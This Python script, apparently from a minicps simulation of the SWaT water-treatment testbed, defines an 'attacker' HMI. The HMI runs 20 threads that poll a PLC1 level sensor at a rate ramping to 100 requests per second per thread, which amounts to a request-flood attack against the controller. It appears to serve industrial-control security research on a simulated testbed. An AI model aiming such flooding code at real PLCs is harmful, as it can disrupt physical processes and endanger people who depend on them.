from minicps.devices import HMI, PLC
from utils import ATTACKER_DATA, STATE, ATTACKER_PROTOCOL
from utils import PLC_PERIOD_SEC, PLC_SAMPLES
from utils import IP
import time
import threading
from queue import Queue
import logging
from typing import Tuple

# Configure logging
logging.basicConfig(
    level=logging.DEBUG,
    format='%(asctime)s - %(threadName)s - %(message)s'
)

MV401 = ('MV401', 4)
LIT101 = ('LIT101', 1)
LIT107 = ('LIT107', 1)
PLC1_ADDR = IP['plc1']
PLC4_ADDR = IP['attacker']

# Constants for timing
RAMP_UP_TIME = 390  # 6.5 minutes in seconds
MIN_DELAY = 0.01  # Minimum delay between requests (maximum speed)
MAX_DELAY = 1.0   # Starting delay between requests (slow speed)

class AttackerHMI(HMI):
    data_queue = Queue()
    stop_event = threading.Event()
    current_delay = threading.Event()  # Event for coordinating delays
    threads = []
    
    def __init__(self, name, state, protocol, memory, disk):
        super().__init__(name, state, protocol, memory, disk)
        self.current_delay_value = MAX_DELAY

    def calculate_current_delay(self, elapsed_time):
        """Calculate the current delay based on elapsed time"""
        if elapsed_time >= RAMP_UP_TIME:
            return MIN_DELAY
        
        # Linear decrease in delay from MAX_DELAY to MIN_DELAY
        remaining_delay = MAX_DELAY - (elapsed_time / RAMP_UP_TIME) * (MAX_DELAY - MIN_DELAY)
        return max(remaining_delay, MIN_DELAY)

    def receiver_thread(self, thread_id: int):
        """Individual thread function with dynamic delay"""
        logger = logging.getLogger(f'Thread-{thread_id}')
        
        while not self.stop_event.is_set():
            try:
                value = float(self.receive(LIT107, PLC1_ADDR))
                timestamp = time.time()
                self.data_queue.put((thread_id, timestamp, value))
                logger.debug(f'Received value: {value} with delay {self.current_delay_value:.3f}s')
                
                # Wait for the current delay period
                time.sleep(self.current_delay_value)
                
            except Exception as e:
                logger.error(f'Error in receiver thread: {e}')
                time.sleep(0.01)

    def process_data_thread(self):
        """Thread to process and log received data"""
        while not self.stop_event.is_set():
            try:
                if not self.data_queue.empty():
                    thread_id, timestamp, value = self.data_queue.get()
                    logging.info(f'Thread {thread_id} data - Timestamp: {timestamp}, Value: {value}')
                time.sleep(0.1)
            except Exception as e:
                logging.error(f'Error processing data: {e}')

    def delay_control_thread(self):
        """Thread to control the ramping up of request frequency"""
        logger = logging.getLogger('DelayControl')
        start_time = time.time()
        
        while not self.stop_event.is_set():
            elapsed_time = time.time() - start_time
            
            # Update the current delay
            self.current_delay_value = self.calculate_current_delay(elapsed_time)
            
            # Log progress at regular intervals
            if int(elapsed_time) % 30 == 0:  # Log every 30 seconds
                progress = min((elapsed_time / RAMP_UP_TIME) * 100, 100)
                logger.info(f"Attack progress: {progress:.1f}% - Current delay: {self.current_delay_value:.3f}s")
            
            # Small sleep to prevent excessive CPU usage
            time.sleep(0.1)
            
            # Check if we've reached maximum speed
            if elapsed_time >= RAMP_UP_TIME:
                logger.info("Attack reached maximum speed")
                break

    def pre_loop(self, sleep=0.1):
        """Initialize threads before main loop"""
        logging.info('DEBUG: swat-s1 attacker enters pre_loop')
        time.sleep(sleep)

    def start_threads(self, num_threads: int = 20):
        """Start receiver threads, data processing thread, and delay control thread"""
        # Start delay control thread
        delay_thread = threading.Thread(
            target=self.delay_control_thread,
            name='DelayControl'
        )
        delay_thread.daemon = True
        delay_thread.start()
        self.threads.append(delay_thread)

        # Start receiver threads
        for i in range(num_threads):
            thread = threading.Thread(
                target=self.receiver_thread,
                args=(i,),
                name=f'Receiver-{i}'
            )
            thread.daemon = True
            thread.start()
            self.threads.append(thread)

        # Start data processing thread
        process_thread = threading.Thread(
            target=self.process_data_thread,
            name='DataProcessor'
        )
        process_thread.daemon = True
        process_thread.start()
        self.threads.append(process_thread)

    def stop_threads(self):
        """Stop all threads gracefully"""
        self.stop_event.set()
        for thread in self.threads:
            thread.join(timeout=1.0)
        logging.info('All threads stopped')

    def main_loop(self):
        """Main loop to manage threads"""
        logging.info('DEBUG: swat-s1 attacker enters main_loop')
        try:
            # Start threads
            self.start_threads(20)
            # Keep main thread alive and handle keyboard interrupt
            while True:
                time.sleep(1)
        except KeyboardInterrupt:
            logging.info('Received keyboard interrupt, shutting down...')
        finally:
            self.stop_threads()
            logging.info('DEBUG swat attacker shutdown')

if __name__ == "__main__":
    attacker = AttackerHMI(
        name='attacker',
        state=STATE,
        protocol=ATTACKER_PROTOCOL,
        memory=ATTACKER_DATA,
        disk=ATTACKER_DATA)
    attacker.start()